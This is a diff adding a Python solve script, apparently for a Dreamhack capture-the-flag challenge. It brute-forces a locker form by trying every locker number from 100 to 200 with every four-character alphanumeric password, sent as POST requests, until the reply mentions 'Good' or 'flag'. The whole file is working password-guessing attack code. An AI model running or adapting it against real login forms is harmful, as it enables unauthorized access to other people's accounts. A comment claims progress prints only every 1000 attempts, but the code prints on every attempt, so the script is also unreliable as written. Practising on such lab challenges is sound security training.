@@ -1,0 +1,46 @@
+import string
+import requests
+
+alphanumeric = string.ascii_lowercase + string.digits
+url = "http://host3.dreamhack.games:14694/"
+
+# requests.Session을 사용하면 연결을 유지하여 요청 속도가 빨라집니다.
+session = requests.Session()
+
+times = 0
+found = False
+
+# 락커 번호가 고정되어 있거나 순회하는 구조라면 숫자를 바깥으로 빼는 것이 유리할 수 있습니다.
+# 만약 문제에서 locker_num이 100~200 사이고 password가 4자리 문자열이라면 아래 구조가 맞습니다.
+for num in range(100, 200 + 1):
+    for i in alphanumeric:
+        for j in alphanumeric:
+            for k in alphanumeric:
+                for n in alphanumeric:
+                    rand_str = i + j + k + n
+                    parms = {'locker_num': num, 'password': rand_str}
+                    
+                    try:
+                        res = session.post(url, data=parms, timeout=3)
+                    except requests.exceptions.RequestException:
+                        continue
+
+                    times += 1
+                    
+                    # 진행 상황을 1000번마다 한 번씩만 출력하여 I/O 병목 현상 방지
+                   
+                    print(f"진행 중... 시도 횟수: {times}")
+
+                    if "Good" in res.text or "flag" in res.text.lower():
+                        print(f"\n[+] 성공! 번호: {num}, 비밀번호: {rand_str}")
+                        print(res.text)
+                        found = True
+                        break
+                if found:
+                    break
+            if found:
+                break
+        if found:
+            break
+    if found:
+        break
